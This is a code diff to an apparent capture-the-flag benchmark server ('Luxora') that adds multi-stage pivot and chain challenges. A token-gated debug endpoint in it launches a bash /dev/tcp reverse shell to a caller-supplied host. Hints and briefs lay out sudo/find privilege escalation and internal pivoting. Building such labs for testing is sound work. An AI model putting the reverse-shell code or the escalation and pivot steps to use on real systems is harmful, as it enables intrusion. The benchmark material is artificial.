@@ -302,16 +302,6 @@ function registerCsrf(app, ctx) {
   });
 }
 
-// 16. Clickjack
-function registerClickjack(app, ctx) {
-  const scenario = "Sensitive action page. It should not be possible to embed this page in an iframe on attacker.com.";
-  app.get(ctx.mode, (req, res) => {
-    res.removeHeader('X-Frame-Options');
-    if (req.query.framed === 'true') return ctx.issueFlag(res, { vector: 'clickjack' });
-    sendPage(res, ctx, `<div class="result" style="text-align:center; padding: 40px; background: #ef4444; color:white; font-weight:bold;">DELETE ACCOUNT</div><p>Simulate framing by adding <code>?framed=true</code></p>`, scenario);
-  });
-}
-
 // 17. PostMsg
 function registerPostmsg(app, ctx) {
   const scenario = "HTML5 postMessage receiver. Our frontend waits for messages from authorized origins only.";
@@ -553,13 +543,38 @@ function registerHost(app, ctx) {
 // 36. Container
 function registerContainer(app, ctx) {
   const scenario = "Docker container environment query tool. If the unix socket is mounted, one might theoretically escape.";
+  const stageToken = hardStageToken(ctx, 'container');
+  registerCallbackOnlyEndpoint(app, ctx, 'container', () => stageToken);
+
   app.get(ctx.mode, (req, res) => {
     const s = req.query.socket;
     const form = `<form method="GET"><div class="form-group"><label>Socket Name</label><input type="text" name="socket" value="${escapeHtml(s||'systemd')}"></div><button type="submit">Query Socket</button></form>`;
-    if (s === 'docker' || s === '/var/run/docker.sock') return ctx.issueFlag(res, { vector: 'container-escape' });
+    if (s === 'docker' || s === '/var/run/docker.sock') {
+      const artifacts = lockHardPivotArtifacts(ctx, 'container');
+      return res.json({
+        success: true,
+        challenge: ctx.mode,
+        unlocked: 'edge-reverse-shell-callback',
+        stageToken,
+        message: `Container socket signal confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
+        evidence: { vector: 'container-pivot-chain' }
+      });
+    }
     sendPage(res, ctx, form + `<div class="result error">Permission denied accessing socket ${escapeHtml(s)}.</div>`, scenario);
   });
 }
+
+const PIVOT_SILVER_SPEC = Object.freeze({
+  encodedHex: '48cafc3e364a9e38b6447403f861d566be4f92b0bc27',
+  order: Object.freeze([7, 14, 1, 18, 5, 12, 19, 6, 13, 0, 17, 4, 11, 20, 3, 10, 21, 8, 15, 2, 9, 16])
+});
+const PIVOT_SILVER_KEY = '4edc28c7f5b9a1d6c3e07ab4';
+
+const CHAIN_SILVER_SPEC = Object.freeze({
+  encodedHex: '3ae4ebea7ed269203f20ae4a13016c21253173cf1f6ad2f562',
+  order: Object.freeze([9, 2, 17, 24, 7, 14, 21, 4, 11, 18, 1, 8, 15, 22, 5, 12, 19, 0, 23, 6, 13, 20, 3, 10, 16])
+});
+const CHAIN_SILVER_KEY = '91f8b7a33e42c0d66ab5f79e';
 
 const REVERSE_SILVER_SPEC = Object.freeze({
   encodedHex: '45bbf7f93aa9deaa9cb0a28cf5c34ee7a8b8445c1b874f51',
@@ -614,7 +629,90 @@ function reverseSilverArtifact() {
 })();\n`;
 }
 
+function pivotSilverKey(index) {
+  return ((index * 17) ^ 0x5d ^ ((index + 5) * 9)) & 0xff;
+}
+
+function pivotSilverEncodedBytes() {
+  return PIVOT_SILVER_SPEC.encodedHex.match(/../g).map((byte) => Number.parseInt(byte, 16));
+}
+
+function pivotSilverToken() {
+  const bytes = new Array(PIVOT_SILVER_SPEC.order.length);
+  pivotSilverEncodedBytes().forEach((encoded, position) => {
+    const sourceIndex = PIVOT_SILVER_SPEC.order[position];
+    bytes[sourceIndex] = ror8(encoded, (sourceIndex % 5) + 1) ^ pivotSilverKey(sourceIndex);
+  });
+  return Buffer.from(bytes).toString('utf8');
+}
+
+function pivotSilverArtifact() {
+  return `/* Luxora pivot-silver artifact. Recover the edge token, then pivot internally. */
+(() => {
+  const __payload = "${PIVOT_SILVER_SPEC.encodedHex}";
+  const __order = [${PIVOT_SILVER_SPEC.order.join(',')}];
+  const rol8 = (value, bits) => ((value << bits) | (value >> (8 - bits))) & 255;
+  const key = (index) => ((index * 17) ^ 0x5d ^ ((index + 5) * 9)) & 255;
+  function check(candidate) {
+    const input = Array.from(candidate || '', (char) => char.charCodeAt(0));
+    if (input.length !== __order.length) return false;
+    const encoded = __payload.match(/../g).map((byte) => Number.parseInt(byte, 16));
+    return encoded.every((byte, position) => {
+      const sourceIndex = __order[position];
+      return rol8(input[sourceIndex] ^ key(sourceIndex), (sourceIndex % 5) + 1) === byte;
+    });
+  }
+  globalThis.luxoraPivotSilver = {
+    check,
+    hint: 'Recover the token, unlock /pivot/silver/debug, then use the edge host to reach the internal pivot relay.'
+  };
+})();\n`;
+}
+
+function chainSilverKey(index) {
+  return ((index * 23) ^ 0x91 ^ ((index + 7) * 13)) & 0xff;
+}
+
+function chainSilverEncodedBytes() {
+  return CHAIN_SILVER_SPEC.encodedHex.match(/../g).map((byte) => Number.parseInt(byte, 16));
+}
+
+function chainSilverToken() {
+  const bytes = new Array(CHAIN_SILVER_SPEC.order.length);
+  chainSilverEncodedBytes().forEach((encoded, position) => {
+    const sourceIndex = CHAIN_SILVER_SPEC.order[position];
+    bytes[sourceIndex] = ror8(encoded, (sourceIndex % 5) + 1) ^ chainSilverKey(sourceIndex);
+  });
+  return Buffer.from(bytes).toString('utf8');
+}
+
+function chainSilverArtifact() {
+  return `/* Luxora chain-silver artifact. Reverse the verifier, then prove shell + pivot control. */
+(() => {
+  const __payload = "${CHAIN_SILVER_SPEC.encodedHex}";
+  const __order = [${CHAIN_SILVER_SPEC.order.join(',')}];
+  const rol8 = (value, bits) => ((value << bits) | (value >> (8 - bits))) & 255;
+  const key = (index) => ((index * 23) ^ 0x91 ^ ((index + 7) * 13)) & 255;
+  function check(candidate) {
+    const input = Array.from(candidate || '', (char) => char.charCodeAt(0));
+    if (input.length !== __order.length) return false;
+    const encoded = __payload.match(/../g).map((byte) => Number.parseInt(byte, 16));
+    return encoded.every((byte, position) => {
+      const sourceIndex = __order[position];
+      return rol8(input[sourceIndex] ^ key(sourceIndex), (sourceIndex % 5) + 1) === byte;
+    });
+  }
+  globalThis.luxoraChainSilver = {
+    check,
+    hint: 'The token only starts the edge callback. Catch a real shell, escalate, then pivot to the internal relay for the final flag.'
+  };
+})();\n`;
+}
+
 let reverseSilverFlagLocked = false;
+let pivotSilverArtifactsLocked = false;
+let chainSilverArtifactsLocked = false;
+const hardPivotArtifactLocks = new Set();
 
 // Writes the flag file as the running user (ctfuser), then uses the
 // pre-provisioned `sudo find` GTFOBins misconfiguration (see app/Dockerfile)
@@ -636,6 +734,163 @@ function lockReverseSilverFlag(ctx) {
   } catch (err) {
     console.log(`[reverse-silver] failed to lock flag file, leaving ctfuser-owned: ${err.message}`);
   }
+}
+
+function lockPivotSilverArtifacts(ctx) {
+  if (pivotSilverArtifactsLocked) return;
+  pivotSilverArtifactsLocked = true;
+
+  const pivotKey = process.env.PIVOT_KEY || PIVOT_SILVER_KEY;
+  const pivotHost = process.env.PIVOT_HOST || 'pivot-relay';
+  const pivotPort = process.env.PIVOT_PORT || '8081';
+  const keyPath = ctx.artifactPath('pivot.key');
+  const briefPath = ctx.artifactPath('pivot-brief.txt');
+
+  fs.writeFileSync(keyPath, `${pivotKey}\n`, { mode: 0o600 });
+  fs.writeFileSync(
+    briefPath,
+    [
+      'Edge foothold confirmed.',
+      `Internal-only relay: http://${pivotHost}:${pivotPort}/`,
+      `Auth header: X-Pivot-Key from ${keyPath}`,
+      'POST {"host":"host.docker.internal","port":LISTENER_PORT} to /callback to receive a second reverse shell.',
+      'The benchmark flag lives on the pivot relay host, not on this edge host.'
+    ].join('\n') + '\n',
+    { mode: 0o600 }
+  );
+
+  for (const artifactPath of [keyPath, briefPath]) {
+    try {
+      execSync(
+        `sudo find "${artifactPath}" -maxdepth 0 -exec chown root:root {} \\; -exec chmod 400 {} \\;`,
+        { stdio: 'ignore' }
+      );
+    } catch (err) {
+      console.log(`[pivot-silver] failed to lock ${artifactPath}: ${err.message}`);
+    }
+  }
+  console.log('[pivot-silver] pivot key and brief locked to root:root 0400 via sudo/find');
+}
+
+function hardStageToken(ctx, label) {
+  return `STAGE{${label.toUpperCase()}_${ctx.slug.toUpperCase().replace(/-/g, '_')}}`;
+}
+
+function lockHardPivotArtifacts(ctx, label) {
+  const lockKey = `${ctx.slug}:${label}`;
+  const pivotKey = process.env.PIVOT_KEY || hardStageToken(ctx, `${label}-pivot-key`);
+  const pivotHost = process.env.PIVOT_HOST || `${label}-relay`;
+  const pivotPort = process.env.PIVOT_PORT || '8081';
+  const keyPath = ctx.artifactPath(`${label}-pivot.key`);
+  const briefPath = ctx.artifactPath(`${label}-brief.txt`);
+
+  if (!hardPivotArtifactLocks.has(lockKey)) {
+    hardPivotArtifactLocks.add(lockKey);
+    fs.writeFileSync(keyPath, `${pivotKey}\n`, { mode: 0o600 });
+    fs.writeFileSync(
+      briefPath,
+      [
+        `${label} hard-chain edge foothold confirmed.`,
+        `Internal-only relay: http://${pivotHost}:${pivotPort}/`,
+        `Auth header: X-Pivot-Key from ${keyPath}`,
+        'The HTTP endpoint only triggers a reverse shell callback.',
+        'Use the edge shell plus sudo/find privilege escalation to recover the relay key.',
+        'POST {"host":"host.docker.internal","port":LISTENER_PORT} to /callback from the edge shell to receive the pivot shell.',
+        'The final benchmark flag lives on the relay host.'
+      ].join('\n') + '\n',
+      { mode: 0o600 }
+    );
+
+    for (const artifactPath of [keyPath, briefPath]) {
+      try {
+        execSync(
+          `sudo find "${artifactPath}" -maxdepth 0 -exec chown root:root {} \\; -exec chmod 400 {} \\;`,
+          { stdio: 'ignore' }
+        );
+      } catch (err) {
+        console.log(`[${label}-silver] failed to lock ${artifactPath}: ${err.message}`);
+      }
+    }
+    console.log(`[${label}-silver] relay key and brief locked to root:root 0400 via sudo/find`);
+  }
+
+  return { keyPath, briefPath, pivotHost, pivotPort };
+}
+
+function callbackHostOk(value) {
+  return typeof value === 'string' && /^[A-Za-z0-9_.:-]+$/.test(value);
+}
+
+function callbackPort(value) {
+  const port = Number.parseInt(String(value), 10);
+  if (!Number.isInteger(port) || port <= 0 || port > 65535) return null;
+  return port;
+}
+
+function registerCallbackOnlyEndpoint(app, ctx, label, tokenProvider) {
+  app.post(`${ctx.mode}/debug`, (req, res) => {
+    const token = req.headers['x-debug-token'] || req.headers['x-stage-token'];
+    if (!token || token !== tokenProvider()) {
+      console.log(`[${label}-silver] callback rejected: missing or invalid stage token`);
+      return res.status(403).json({ error: 'edge callback locked; solve the first stage' });
+    }
+
+    const host = req.body && (req.body.host || req.body.callback_host);
+    const port = callbackPort(req.body && (req.body.port || req.body.callback_port));
+    if (!callbackHostOk(host) || !port) {
+      return res.status(400).json({ error: 'host and port are required for the reverse shell callback' });
+    }
+
+    const command = `setsid bash -lc 'exec bash -i >& /dev/tcp/${host}/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown`;
+    console.log(`[${label}-silver] triggering edge reverse shell callback to ${host}:${port}`);
+    exec(command, { shell: '/bin/sh', timeout: 15000 }, (error) => {
+      if (error) console.log(`[${label}-silver] edge callback launch failed: ${error.message}`);
+    });
+
+    res.json({
+      triggered: true,
+      callback: { host, port },
+      note: 'No command output is returned over HTTP. Continue from the reverse shell session.'
+    });
+  });
+}
+
+function lockChainSilverArtifacts(ctx) {
+  if (chainSilverArtifactsLocked) return;
+  chainSilverArtifactsLocked = true;
+
+  const pivotKey = process.env.PIVOT_KEY || CHAIN_SILVER_KEY;
+  const pivotHost = process.env.PIVOT_HOST || 'chain-relay';
+  const pivotPort = process.env.PIVOT_PORT || '8081';
+  const keyPath = ctx.artifactPath('chain-pivot.key');
+  const briefPath = ctx.artifactPath('chain-brief.txt');
+
+  fs.writeFileSync(keyPath, `${pivotKey}\n`, { mode: 0o600 });
+  fs.writeFileSync(
+    briefPath,
+    [
+      'Reverse shell callback confirmed as the required foothold.',
+      `Internal-only relay: http://${pivotHost}:${pivotPort}/`,
+      `Auth header: X-Pivot-Key from ${keyPath}`,
+      'The HTTP debug endpoint cannot run arbitrary commands or return command output.',
+      'Use the edge shell plus local sudo/find privilege escalation to recover the relay key.',
+      'POST {"host":"host.docker.internal","port":LISTENER_PORT} to /callback from the edge host to receive the pivot shell.',
+      'The final benchmark flag lives on the relay host.'
+    ].join('\n') + '\n',
+    { mode: 0o600 }
+  );
+
+  for (const artifactPath of [keyPath, briefPath]) {
+    try {
+      execSync(
+        `sudo find "${artifactPath}" -maxdepth 0 -exec chown root:root {} \\; -exec chmod 400 {} \\;`,
+        { stdio: 'ignore' }
+      );
+    } catch (err) {
+      console.log(`[chain-silver] failed to lock ${artifactPath}: ${err.message}`);
+    }
+  }
+  console.log('[chain-silver] pivot key and brief locked to root:root 0400 via sudo/find');
 }
 
 // 37. Reverse
@@ -709,19 +964,155 @@ function registerReverse(app, ctx) {
   });
 }
 
-// 38. Webshell
+// 38. Pivot
+function registerPivot(app, ctx) {
+  const scenario = "An edge diagnostics service exposes a client-side verifier. Recover the token, unlock command execution, pop a real reverse shell, escalate locally to read the pivot key, then use the internal-only relay to catch a second shell and read the final flag.";
+  const form = (payload = '') => `<form method="GET"><div class="form-group"><label>Recovered edge token</label><input type="text" name="payload" value="${escapeHtml(payload)}" autocomplete="off"></div><button type="submit">Unlock Edge Diagnostics</button></form>`;
+  registerCallbackOnlyEndpoint(app, ctx, 'pivot', () => pivotSilverToken());
+
+  app.get(`${ctx.mode}/artifact.js`, (req, res) => {
+    console.log(`[pivot-silver] artifact served to ${req.ip || 'unknown'}`);
+    res.type('application/javascript').send(pivotSilverArtifact());
+  });
+
+  app.get(`${ctx.mode}/hints`, (req, res) => {
+    res.json({
+      challenge: ctx.mode,
+      hints: [
+        'Fetch /pivot/silver/artifact.js and recover the verifier token.',
+        'The recovered token unlocks /pivot/silver/debug; it is not the flag.',
+        'Use the debug hook to open a real reverse shell from the edge container.',
+        'The edge user cannot read pivot artifacts directly. Check sudo privileges.',
+        'Read pivot-brief.txt and pivot.key from the edge artifact directory.',
+        'The pivot relay is internal-only and must be contacted from the edge host.',
+        'Trigger /callback on the relay to receive a second reverse shell and read the final flag there.'
+      ]
+    });
+  });
+
+  app.get(ctx.mode, (req, res) => {
+    const p = req.query.payload;
+    if (p && p === pivotSilverToken()) {
+      console.log('[pivot-silver] solved token accepted; debug hook unlocked');
+      lockPivotSilverArtifacts(ctx);
+      return res.json({
+        success: true,
+        challenge: ctx.mode,
+        unlocked: 'edge-reverse-shell-callback',
+        message: `Token accepted. POST ${ctx.mode}/debug with header X-Debug-Token: <token> and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read the relay key, then pivot internally for the final flag.`,
+        evidence: { vector: 'pivot-silver-reversing-rce-pivot', artifact: `${ctx.mode}/artifact.js` }
+      });
+    }
+
+    const links = `<div class="result">Artifacts:<br>
+      GET <a href="${ctx.mode}/artifact.js">${ctx.mode}/artifact.js</a><br>
+      GET <a href="${ctx.mode}/hints">${ctx.mode}/hints</a><br><br>
+      Goal: recover the token, unlock the edge debug hook, and pivot through the internal relay. The final flag is never returned over HTTP.</div>`;
+    const feedback = p ? `<div class="result error">Token rejected. Re-check byte order, rotate direction, and xor key schedule.</div>` : '';
+    sendPage(res, ctx, form(p || '') + links + feedback, scenario);
+  });
+}
+
+// 39. Chain
+function registerChain(app, ctx) {
+  const scenario = "Combined advanced chain. Reverse the client artifact to unlock only a reverse-shell callback, catch the edge shell, escalate locally to recover the relay key, pivot to the internal-only relay, then read the final flag from the relay host.";
+  const form = (payload = '') => `<form method="GET"><div class="form-group"><label>Recovered chain token</label><input type="text" name="payload" value="${escapeHtml(payload)}" autocomplete="off"></div><button type="submit">Unlock Edge Callback</button></form>`;
+
+  app.get(`${ctx.mode}/artifact.js`, (req, res) => {
+    console.log(`[chain-silver] artifact served to ${req.ip || 'unknown'}`);
+    res.type('application/javascript').send(chainSilverArtifact());
+  });
+
+  app.get(`${ctx.mode}/hints`, (req, res) => {
+    res.json({
+      challenge: ctx.mode,
+      hints: [
+        'Fetch /chain/silver/artifact.js and recover the verifier token.',
+        'Submitting the token does not expose command output or the flag.',
+        'POST /chain/silver/debug with X-Debug-Token and JSON {"host":"...","port":...}; it only triggers an edge reverse shell callback.',
+        'The edge shell lands as ctfuser. The relay key and brief are root-readable only.',
+        'Use local sudo/find privilege escalation from the edge shell to read chain-pivot.key and chain-brief.txt.',
+        'The relay is internal-only as chain-relay:8081 and must be called from the edge shell.',
+        'The relay callback opens the second shell. Read the final flag from that pivot host.'
+      ]
+    });
+  });
+
+  app.post(`${ctx.mode}/debug`, (req, res) => {
+    const token = req.headers['x-debug-token'];
+    if (!token || token !== chainSilverToken()) {
+      console.log('[chain-silver] callback rejected: missing or invalid X-Debug-Token');
+      return res.status(403).json({ error: 'edge callback locked; solve the chain artifact first' });
+    }
+
+    const host = req.body && (req.body.host || req.body.callback_host);
+    const port = callbackPort(req.body && (req.body.port || req.body.callback_port));
+    if (!callbackHostOk(host) || !port) {
+      return res.status(400).json({ error: 'host and port are required for the reverse shell callback' });
+    }
+
+    const command = `setsid bash -lc 'exec bash -i >& /dev/tcp/${host}/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown`;
+    console.log(`[chain-silver] triggering edge reverse shell callback to ${host}:${port}`);
+    exec(command, { shell: '/bin/sh', timeout: 15000 }, (error) => {
+      if (error) console.log(`[chain-silver] edge callback launch failed: ${error.message}`);
+    });
+
+    res.json({
+      triggered: true,
+      callback: { host, port },
+      note: 'No command output is returned over HTTP. Continue from the reverse shell session.'
+    });
+  });
+
+  app.get(ctx.mode, (req, res) => {
+    const p = req.query.payload;
+    if (p && p === chainSilverToken()) {
+      console.log('[chain-silver] solved token accepted; edge callback unlocked');
+      lockChainSilverArtifacts(ctx);
+      return res.json({
+        success: true,
+        challenge: ctx.mode,
+        unlocked: 'edge-reverse-shell-callback',
+        message: `Token accepted. POST ${ctx.mode}/debug with header X-Debug-Token: <token> and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. You must continue from the shell and pivot internally for the flag.`,
+        evidence: { vector: 'chain-silver-reversing-revshell-privesc-pivot', artifact: `${ctx.mode}/artifact.js` }
+      });
+    }
+
+    const links = `<div class="result">Artifacts:<br>
+      GET <a href="${ctx.mode}/artifact.js">${ctx.mode}/artifact.js</a><br>
+      GET <a href="${ctx.mode}/hints">${ctx.mode}/hints</a><br><br>
+      Goal: recover the token, trigger the edge reverse shell, escalate to read the relay key, pivot to the relay, and read the final flag there.</div>`;
+    const feedback = p ? `<div class="result error">Token rejected. Re-check the permutation, rotation direction, and key schedule.</div>` : '';
+    sendPage(res, ctx, form(p || '') + links + feedback, scenario);
+  });
+}
+
+// 40. Webshell
 function registerWebshell(app, ctx) {
   const scenario = "Assume you bypassed file upload checks and dropped a webshell. Now send an OS command parameter to it.";
+  const stageToken = hardStageToken(ctx, 'webshell');
+  registerCallbackOnlyEndpoint(app, ctx, 'webshell', () => stageToken);
+
   app.post(ctx.mode, (req, res) => {
     const code = req.body.code || '';
     const form = `<form method="POST"><div class="form-group"><label>Mock shell.php execution code</label><input type="text" name="code" value="${escapeHtml(code)}"></div><button type="submit">Execute Shell Func</button></form>`;
-    if (code.includes('system(')) return ctx.issueFlag(res, { vector: 'webshell' });
+    if (code.includes('system(')) {
+      const artifacts = lockHardPivotArtifacts(ctx, 'webshell');
+      return res.json({
+        success: true,
+        challenge: ctx.mode,
+        unlocked: 'edge-reverse-shell-callback',
+        stageToken,
+        message: `Webshell primitive confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
+        evidence: { vector: 'webshell-pivot-chain' }
+      });
+    }
     sendPage(res, ctx, form + `<div class="result error">Fatal PHP Error: Undefined instruction.</div>`, scenario);
   });
   app.get(ctx.mode, (req, res) => sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>Mock shell.php execution code</label><input type="text" name="code" value="phpinfo()"></div><button type="submit">Execute Shell Func</button></form>`, scenario));
 }
 
-// 39. Multistage
+// 41. Multistage
 function registerMultistage(app, ctx) {
   const scenario = "Attackers chaining foothold into lateral pivot. This tests identification of multiple stages.";
   app.post(ctx.mode, (req, res) => {
@@ -733,13 +1124,26 @@ function registerMultistage(app, ctx) {
   app.get(ctx.mode, (req, res) => sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>Attack Chain Identifier</label><input type="text" name="chain" value="foothold"></div><button type="submit">Submit Timeline</button></form>`, scenario));
 }
 
-// 40. Persist
+// 42. Persist
 function registerPersist(app, ctx) {
   const scenario = "Once root is achieved, attackers usually leave an SSH key or modify cron jobs. Simulate this backdoor mechanism.";
+  const stageToken = hardStageToken(ctx, 'persist');
+  registerCallbackOnlyEndpoint(app, ctx, 'persist', () => stageToken);
+
   app.post(ctx.mode, (req, res) => {
     const method = req.body.method || '';
     const form = `<form method="POST"><div class="form-group"><label>Persistence Technique Parameter</label><input type="text" name="method" value="${escapeHtml(method)}"></div><button type="submit">Install Backdoor</button></form>`;
-    if (method === 'cron') return ctx.issueFlag(res, { vector: 'persistence' });
+    if (method === 'cron') {
+      const artifacts = lockHardPivotArtifacts(ctx, 'persist');
+      return res.json({
+        success: true,
+        challenge: ctx.mode,
+        unlocked: 'edge-reverse-shell-callback',
+        stageToken,
+        message: `Persistence primitive confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
+        evidence: { vector: 'persist-pivot-chain' }
+      });
+    }
     sendPage(res, ctx, form + `<div class="result error">Not a recognized persistence mechanism.</div>`, scenario);
   });
   app.get(ctx.mode, (req, res) => sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>Persistence Technique Parameter</label><input type="text" name="method" value="user_add"></div><button type="submit">Install Backdoor</button></form>`, scenario));
@@ -761,7 +1165,6 @@ const CHALLENGE_BUILDERS = {
   '/rbac/silver': registerRbac,
   '/xss/silver': registerXss,
   '/csrf/silver': registerCsrf,
-  '/clickjack/silver': registerClickjack,
   '/postmsg/silver': registerPostmsg,
   '/lfi/silver': registerLfi,
   '/upload/silver': registerUpload,
@@ -778,11 +1181,12 @@ const CHALLENGE_BUILDERS = {
   '/info-disc/silver': registerInfoDisc,
   '/secret/silver': registerSecret,
   '/timing/silver': registerTiming,
-  '/redirect/silver': registerRedirect,
   '/cors/silver': registerCors,
   '/host/silver': registerHost,
   '/container/silver': registerContainer,
   '/reverse/silver': registerReverse,
+  '/pivot/silver': registerPivot,
+  '/chain/silver': registerChain,
   '/webshell/silver': registerWebshell,
   '/multistage/silver': registerMultistage,
   '/persist/silver': registerPersist
